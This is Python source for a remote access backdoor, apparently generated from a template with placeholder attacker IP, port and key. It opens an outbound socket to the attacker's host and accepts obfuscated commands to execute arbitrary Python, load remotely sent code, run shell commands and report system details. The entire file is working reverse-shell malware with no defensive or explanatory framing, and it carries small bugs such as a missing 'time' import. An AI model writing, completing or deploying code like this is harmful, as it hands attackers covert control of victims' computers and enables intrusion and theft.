import socket
import subprocess
import requests
import os
import platform
import sys

md5 = '{PREPPER MD5}'
def enctry(s,k):
    k *= 0xFFFF
    encry_str = ""
    for i,j in zip(s,k):
        temp = str(ord(i)+ord(j))+'_'
        encry_str = encry_str + temp
    return encry_str
def dectry(p,k):
    k *= 0xFFFF
    dec_str = ""
    for i,j in zip(p.split("_")[:-1],k):
        temp = chr(int(i) - ord(j))
        dec_str = dec_str+temp
    return dec_str
def connect():
    global md5
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect(("{PREPPER IP}", {PREPPER PORT}))
    while True:
        cmd = server.recv(2048).decode('gbk')
        cmd = dectry(cmd,md5)
        if 'exec' in cmd:
            cmds = cmd.split()
            try:
                command = ''
                for index in range(1, len(cmds)):
                    command += cmds[index] + ' '
                exec(command)
                server.send(enctry('*Exec Done. ;)',md5).encode())
                continue
            except Exception as e:
                server.send(enctry(str(e),md5).encode())
                continue
        elif 'load' in cmd:
            library = server.recv(81962).decode('gbk')
            library = dectry(library,md5)
            try:
                exec(library)
                server.send(enctry("Library loaded &)",md5).encode())
            except Exception as e:
                server.send(enctry(str(e),md5).encode())
        elif 'settimeout' in cmd:
            cmds = cmd.split()
            try:
                server.settimeout(int(cmds[1]))
                server.send(enctry('OK! .)', md5).encode())
            except:
                server.send(enctry('Error .(',md5).encode())
        elif 'help' in cmd:
            help = """
            exec [Python Code]
            exit
            help
            sysinfo
            run [System Command]
            settimeout [Time]
            load [Python File Path]
            """
            server.send(enctry(help,md5).encode())
        elif 'exit' in cmd:
            server.send(enctry('Goodbye.8)',md5).encode())
            time.sleep(0.3)
            server.close()
            sys.exit()
        elif 'sysinfo' in cmd:
            content = """"""
            content += "Platform: " + str(platform.architecture()) + '\n'
            content += "   OS   : " + str(platform.platform()) + '\n'
            content += "  CPU   : " + str(platform.processor()) + '\n'
            content += "  Name  : " + str(platform.node()) + '\n'
            content += "Version : " + str(platform.version())
            server.send(enctry(content,md5).encode())
        elif 'run' in cmd:
            cmds = cmd.split()
            statement = ""
            for index in range(1, len(cmds)):
                statement += cmds[index] + ' '
            p = subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE)
            while p.poll() is None:
                if p.wait() is not 0:
                    server.send(enctry('Bad system command.',md5).encode())
                else:
                    re = p.stdout.readlines()
                    result = []
                    for i in range(len(re)):
                        res = re[i].decode('gbk')
                        result.append(res)
                    re = ""
                    for line in result:
                        re+=line
                    server.send(enctry("Prepper:\n"+re,md5).encode())
        else:
            server.send(enctry('Bad command. !(',md5).encode())

connect()